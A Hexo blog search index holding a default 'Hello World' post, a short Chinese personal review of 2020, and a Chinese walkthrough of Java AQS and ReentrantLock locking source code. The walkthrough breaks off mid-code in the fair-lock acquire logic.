<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2022/10/25/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 All</title>
    <url>/2020/12/29/2021/2020-All/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="2019-2020"><a href="#2019-2020" class="headerlink" title="2019-2020"></a>2019-2020</h2><p>本年度工作</p>
<p>一月份：回老家太冷，废物</p>
<p>二月份：随机汇编，依旧没做事</p>
<p>三月份：回广东，练习CTF</p>
<p>四月份：练习CTF，做Leetcode</p>
<p>五月份：稍微玩了点Android，练习CTF，做Leetcode，做数模</p>
<p>六月份：玩了点机器学习，学习Java，做Leetcode</p>
<p>七月份：废物</p>
<p>八月份：和小方，蔡蔡做数模</p>
<p>九月份：Java</p>
<p>十月份：大创 java 科技节</p>
<p>十一月份：大创 java Leetcode</p>
<p>十二月份：废物</p>
<p>总的来说，这一年其实没有做什么</p>
<p>大都是很简单，很容易的事情</p>
<p>但是在学习和技术之外</p>
<p>也有和母上大人吃吃喝喝，和父上大人怼怼怼怼。</p>
<p>也遇到有趣的伙伴，</p>
<p>和谐相处的队友。</p>
<p>可惜还是没有喜欢的女孩子滏–</p>
<p>回顾一年，其实自己并没有那么难</p>
<p>但是一年嘛，人总是会改变的，所以总的来说还是有些变化</p>
<p>我自己觉得 变得冷静 变得稍微成熟一点了</p>
<p>【其实我也不太清楚 在大多数人面前我都挺随意的–</p>
<p>【但是处理事情，我就会变得稳重一点，不那么跳脱-自己觉得</p>
]]></content>
      <tags>
        <tag>2020</tag>
      </tags>
  </entry>
  <entry>
    <title>AQS源码与Lock</title>
    <url>/2021/04/29/2021/AQS%E5%BA%94%E7%94%A8%E4%B9%8BLock/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="什么是AQS"><a href="#什么是AQS" class="headerlink" title="什么是AQS"></a>什么是AQS</h1><p>Java并发编程核心在于<code>java.concurrent.util</code>包，而juc当中的大多数同步器实现都是围绕着共同的基础行为，比如等待队列、条件队列、独占获取、共享获取等，而这个行为的抽象就是基于<code>AbstractQueuedSynchronizer</code>简称AQS，<strong>AQS定义了一套多线程访问共享资源的同步器框架，是一个依赖状态(state)的同步器。</strong></p>
<p>我们常用的各种同步组件或者锁都是基于这个框架实现的，一般都是通过定义内部类<code>Sync</code>继承AQS将同步器所有调用都映射到Sync对应的方法 。</p>
<h1 id="AQS的特性"><a href="#AQS的特性" class="headerlink" title="AQS的特性"></a>AQS的特性</h1><p>首先大家需要简单了解AQS中的一些特性。</p>
<p>三大核心原理</p>
<p>自旋，LocksSuport, CAS，queue队列</p>
<h2 id="资源状态"><a href="#资源状态" class="headerlink" title="资源状态"></a>资源状态</h2><p>AQS中定义了一个状态变量，用于描述当前资源的状态：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The synchronization state.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//状态变量	</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> state;</span><br></pre></td></tr></table></figure>

<ul>
<li>0：表示当前资源可用，比如锁已被某个线程占用</li>
<li>1：表示当前资源不可用</li>
</ul>
<h2 id="资源共享方式"><a href="#资源共享方式" class="headerlink" title="资源共享方式"></a>资源共享方式</h2><p>AQS定义两种资源共享方式：</p>
<ul>
<li>Exclusive(独占)：只有一个线程能执行，如<code>ReentrantLock</code>。在独享方式下，AQS的父类<code>AbstractOwnableSynchronizer</code>中的包含一个字段，用于指向独享资源的线程：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当前持有资源的线程</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> Thread exclusiveOwnerThread;</span><br></pre></td></tr></table></figure>

<ul>
<li>Share(共享)：多个线程可以同时执行，如<code>Semaphore</code>和<code>CountDownLatch</code>。</li>
</ul>
<h2 id="两种队列"><a href="#两种队列" class="headerlink" title="两种队列"></a>两种队列</h2><p>不同的自定义同步器的特性不同，因此争用共享资源的方式也不同。自定义同步器在实现时只需要实现共享资源的获取与释放方式即可，至于具体线程等待队列的维护（如获取资源失败入队&#x2F;唤醒出队等），AQS已经在顶层实现好了。</p>
<p>AQS中主要包括以下两种队列：</p>
<h3 id="同步等待队列"><a href="#同步等待队列" class="headerlink" title="同步等待队列"></a>同步等待队列</h3><p>AQS当中的同步等待队列也称CLH队列，CLH队列是Craig、Landin、Hagersten三人发明的一种基于<strong>双向链表</strong>数据结构的队列，是<strong>FIFO先入先出</strong>线程等待队列。</p>
<p>同步器依赖内部的同步队列来完成同步状态的管理，当前线程获取资源失败时，同步器会将当前线程以及等待状态等信息构造成称为一个节点(<code>Node</code>)并将其加入同步队列，同时会阻塞当前线程，当同步资源释放时，会把首节点中的线程唤醒，使其再次尝试获取同步资源。链表的结点是AQS中的内部类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 链表的节点,AbstractQueuedSynchronizer的内部类</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 共享模式</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">SHARED</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 互斥(独占)模式</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Node</span> <span class="variable">EXCLUSIVE</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 节点的四个生命状态</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">CANCELLED</span> <span class="operator">=</span>  <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SIGNAL</span>    <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">CONDITION</span> <span class="operator">=</span> -<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PROPAGATE</span> <span class="operator">=</span> -<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 节点的生命状态（信号量）</span></span><br><span class="line"><span class="comment">      * SIGNAL = -1 可被唤醒</span></span><br><span class="line"><span class="comment">      * CANCELLED = 1 出现异常，中断引起的，需要废弃结束</span></span><br><span class="line"><span class="comment">      * CONDITION = -2 条件等待，用于条件等待队列，不用于CLH</span></span><br><span class="line"><span class="comment">      * PROPAGATE = -3 传播</span></span><br><span class="line"><span class="comment">      * 0 初始状态(默认)</span></span><br><span class="line"><span class="comment">      * 为了保证所有阻塞线程对象能够被唤醒</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> waitStatus;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 前驱节点</span></span><br><span class="line">    <span class="keyword">volatile</span> Node prev;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后继节点</span></span><br><span class="line">    <span class="keyword">volatile</span> Node next;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 节点同步状态的线程</span></span><br><span class="line">    <span class="keyword">volatile</span> Thread thread;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 该字段用于条件等待队列，不用于CLH队列</span></span><br><span class="line">    Node nextWaiter;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断是否是共享模式</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">isShared</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> nextWaiter == SHARED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取结点的前驱节点</span></span><br><span class="line">    <span class="keyword">final</span> Node <span class="title function_">predecessor</span><span class="params">()</span> <span class="keyword">throws</span> NullPointerException &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">p</span> <span class="operator">=</span> prev;</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造方法</span></span><br><span class="line">    Node() &#123;    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Node(Thread thread, Node mode) &#123;     </span><br><span class="line">        <span class="built_in">this</span>.nextWaiter = mode;</span><br><span class="line">        <span class="built_in">this</span>.thread = thread;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Node(Thread thread, <span class="type">int</span> waitStatus) &#123; </span><br><span class="line">        <span class="built_in">this</span>.waitStatus = waitStatus;</span><br><span class="line">        <span class="built_in">this</span>.thread = thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个CLH队列的结构大致如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/01/38P1scuqkdfWhIE.jpg"
                      alt="Screenshot_57.jpg"
                ></p>
<p>其头节点和尾结点对应AQS的两个字段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CLH双向链表的head头节点</span></span><br><span class="line"><span class="comment">// 懒加载，由第一个进入等待队列的线程结点加载</span></span><br><span class="line"><span class="comment">// head恒为空结点，即其中的thread为null</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Node head;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CLH双向链表的tail尾结点，排在队列最后的线程结点</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Node tail;</span><br></pre></td></tr></table></figure>

<h3 id="条件等待队列"><a href="#条件等待队列" class="headerlink" title="条件等待队列"></a>条件等待队列</h3><p>与CLH队列不同，Condition是一个多线程间协调通信的工具类，使得某个或者某些线程一起等待某个条件（Condition），只有当该条件具备时，这些等待线程才会被唤醒，从而重新争夺锁。AQS中条件等待队列的结构如下图所示：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/01/zxgCuboeEGLplPB.jpg"
                      alt="Screenshot_58.jpg"
                ></p>
<p>与CLH队列相比，条件等待队列是一个单向链表，并且它的所有节点都不为空(CLH中的头节点为空)。条件等待队列同样也是基于<code>Node</code>构建的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 链表的节点,AbstractQueuedSynchronizer的内部类</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 条件等待队列中指向下一个节点的指针</span></span><br><span class="line">    Node nextWaiter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ConditionObject是AQS中对Condition的实现</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConditionObject</span> <span class="keyword">implements</span> <span class="title class_">Condition</span>, java.io.Serializable &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 条件等待队列中的头节点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Node firstWaiter;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 条件等待队列中的尾节点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Node lastWaiter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="多线程安全性"><a href="#多线程安全性" class="headerlink" title="多线程安全性"></a>多线程安全性</h2><p>AQS如何保证多线程并行下操作的安全性？AQS中使用了<code>volatile</code>关键字修饰变量，并且通过CAS原子操作对这些<code>volatile</code>变量进行修改，保证了多线程情况下操作的原子性和可见性。</p>
<p>AQS在类加载初始化阶段，会执行类中最后部分的静态代码块，完成对类中几个字段的<strong>偏移量</strong>的初始化，方便后续的CAS操作。</p>
<p>主要都是CAS操作，compare and swap是很好的原子获取值。</p>
<h1 id="AQS源码分析"><a href="#AQS源码分析" class="headerlink" title="AQS源码分析"></a>AQS源码分析</h1><p>这是我第一次进行源码分析！</p>
<h2 id="大局看"><a href="#大局看" class="headerlink" title="大局看"></a>大局看</h2><p>粗略的看加锁和解锁流程，如下图：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/05/Vd8eTEA3uJpWLKC.jpg"
                      alt="Screenshot_73.jpg"
                ></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReentrantLock</span> <span class="keyword">implements</span> <span class="title class_">Lock</span>, java.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7373984872572414699L</span>;</span><br><span class="line">    <span class="comment">// 这里是继承了AQS</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Sync sync;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里前置工作做好了</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReentrantLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//默认不公平锁</span></span><br><span class="line">        sync = <span class="keyword">new</span> <span class="title class_">NonfairSync</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//进行构造函数判定是否公平锁</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReentrantLock</span><span class="params">(<span class="type">boolean</span> fair)</span> &#123;</span><br><span class="line">        sync = fair ? <span class="keyword">new</span> <span class="title class_">FairSync</span>() : <span class="keyword">new</span> <span class="title class_">NonfairSync</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//使用的锁是调用sync</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lock</span><span class="params">()</span> &#123;</span><br><span class="line">        sync.lock();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//使用另外一种加锁方式</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lockInterruptibly</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        sync.acquireInterruptibly(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//解锁方式</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">()</span> &#123;</span><br><span class="line">        sync.release(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们看下<code>Sync</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里还是虚拟类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Sync</span> <span class="keyword">extends</span> <span class="title class_">AbstractQueuedSynchronizer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">5179523762034025860L</span>;</span><br><span class="line">     <span class="comment">//对应的lock</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">lock</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//加锁逻辑</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">nonfairTryAcquire</span><span class="params">(<span class="type">int</span> acquires)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Thread</span> <span class="variable">current</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> getState();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, acquires)) &#123;</span><br><span class="line">                setExclusiveOwnerThread(current);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">nextc</span> <span class="operator">=</span> c + acquires;</span><br><span class="line">            <span class="keyword">if</span> (nextc &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class="line">            setState(nextc);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//释放锁的逻辑</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">tryRelease</span><span class="params">(<span class="type">int</span> releases)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> getState() - releases;</span><br><span class="line">        <span class="keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalMonitorStateException</span>();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">free</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">            free = <span class="literal">true</span>;</span><br><span class="line">            setExclusiveOwnerThread(<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        setState(c);</span><br><span class="line">        <span class="keyword">return</span> free;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而对应的有公平锁和非公平锁的继承</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//其实最后还是用的这个Sync</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">NonfairSync</span> <span class="keyword">extends</span> <span class="title class_">Sync</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7316153563782823691L</span>;</span><br><span class="line">    <span class="comment">//实现对应的方法</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">lock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">            setExclusiveOwnerThread(Thread.currentThread());</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            acquire(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">tryAcquire</span><span class="params">(<span class="type">int</span> acquires)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> nonfairTryAcquire(acquires);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Sync object for fair locks</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">FairSync</span> <span class="keyword">extends</span> <span class="title class_">Sync</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">3000897897090466540L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">lock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//进行加锁</span></span><br><span class="line">        acquire(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这里很重要！！</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 如果获取到锁，或者重入锁，那么返回true</span></span><br><span class="line"><span class="comment">     * 否则返回false</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">tryAcquire</span><span class="params">(<span class="type">int</span> acquires)</span> &#123;</span><br><span class="line">        <span class="comment">//当前线程是否</span></span><br><span class="line">        <span class="comment">//在acquire的里面会有这个调用</span></span><br><span class="line">        <span class="comment">//看是否是第一次获取还是没有获取</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Thread</span> <span class="variable">current</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> getState();</span><br><span class="line">        <span class="comment">//判读是否锁空闲</span></span><br><span class="line">        <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!hasQueuedPredecessors() &amp;&amp;</span><br><span class="line">                compareAndSetState(<span class="number">0</span>, acquires)) &#123;</span><br><span class="line">                setExclusiveOwnerThread(current);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">nextc</span> <span class="operator">=</span> c + acquires;</span><br><span class="line">            <span class="keyword">if</span> (nextc &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class="line">            setState(nextc);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先我们说说，<code>ReentrantLock</code>和<code>synchronized</code>它们两的区别：</p>
<ol>
<li>Synchronized是JVM层次的锁实现，ReentrantLock是JDK层次的锁实现</li>
<li>Synchronized的锁状态是无法在代码中直接判断的，但是ReentrantLock可以通过<code>lock.isLocked()</code>判断</li>
<li>Synchronized是非公平锁，ReentrantLock是可以是公平也可以是非公平的</li>
<li>Synchronized是不可以被强行中断的，而ReentrantLock通过<code>lock.lockInterruptibly()</code>方法加锁的话，是可以被强行中断的</li>
<li>在发生异常时Synchronized会自动释放锁（由javac编译时自动实现），而ReentrantLock需要开发者在<strong>finally</strong>块中释放锁</li>
<li>ReentrantLock获取锁的形式有多种：如立即返回是否成功的tryLock(),以及等待指定时长的获取，更加灵活</li>
</ol>
<h2 id="加锁"><a href="#加锁" class="headerlink" title="加锁"></a>加锁</h2><p>我们先进行加锁的思路走，可以发现无论是公平锁还是非公平锁都是调用<code>acquire(1);</code>进行加锁的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">acquire</span><span class="params">(<span class="type">int</span> arg)</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * tryAcquire 是调用公平锁和非公平锁中的代码</span></span><br><span class="line"><span class="comment">     * 这部分代码可以拆解 acquireQueued(addWaiter(Node.EXCLUSIVE), arg)</span></span><br><span class="line"><span class="comment">     * 这是添加进同步等待队列中</span></span><br><span class="line"><span class="comment">     * addWaiter(Node.EXCLUSIVE)</span></span><br><span class="line"><span class="comment">     * 这里是把本线程进入阻塞</span></span><br><span class="line"><span class="comment">     * acquireQueued(Node, arg)</span></span><br><span class="line"><span class="comment">     * 这里很重要的是if逻辑是否会进去</span></span><br><span class="line"><span class="comment">     * 如果进去的话需要会进行自我中断，这是因为acquireQueue返回true是中断产生！</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!tryAcquire(arg) &amp;&amp;</span><br><span class="line">        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))</span><br><span class="line">        <span class="comment">//如果进入这里说明一开始没有获取到锁，进入等待队列中，获取到了锁</span></span><br><span class="line">        <span class="comment">//但是获取锁是依靠中断的</span></span><br><span class="line">        <span class="comment">//那么由于acquireQueued中我们使用的Thread.interrupted();</span></span><br><span class="line">        <span class="comment">//导致中断信号被清空，所以需要再添加上中断信号</span></span><br><span class="line">        selfInterrupt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们一步步来，先看<code>tryAcquire</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="comment">//其实最后还是用的这个Sync</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">NonfairSync</span> <span class="keyword">extends</span> <span class="title class_">Sync</span> &#123;</span><br><span class="line">      <span class="comment">/**</span></span><br><span class="line"><span class="comment">       * 看的出来由于是非公平锁</span></span><br><span class="line"><span class="comment">       * 那么调用Sync的nonfairTryAcquire(acquires)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">tryAcquire</span><span class="params">(<span class="type">int</span> acquires)</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> nonfairTryAcquire(acquires);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">FairSync</span> <span class="keyword">extends</span> <span class="title class_">Sync</span> &#123;</span><br><span class="line"><span class="comment">//调用这里的方法</span></span><br><span class="line">      <span class="keyword">protected</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">tryAcquire</span><span class="params">(<span class="type">int</span> acquires)</span> &#123;</span><br><span class="line">          <span class="comment">//获取当前线程</span></span><br><span class="line">          <span class="keyword">final</span> <span class="type">Thread</span> <span class="variable">current</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">          <span class="comment">//获取当前锁状态</span></span><br><span class="line">          <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> getState();</span><br><span class="line">          <span class="comment">//如果锁是空闲的</span></span><br><span class="line">          <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="comment">//把锁状态由0-&gt;acquires</span></span><br><span class="line">              <span class="keyword">if</span> (!hasQueuedPredecessors() &amp;&amp;</span><br><span class="line">                  compareAndSetState(<span class="number">0</span>, acquires)) &#123;</span><br><span class="line">                  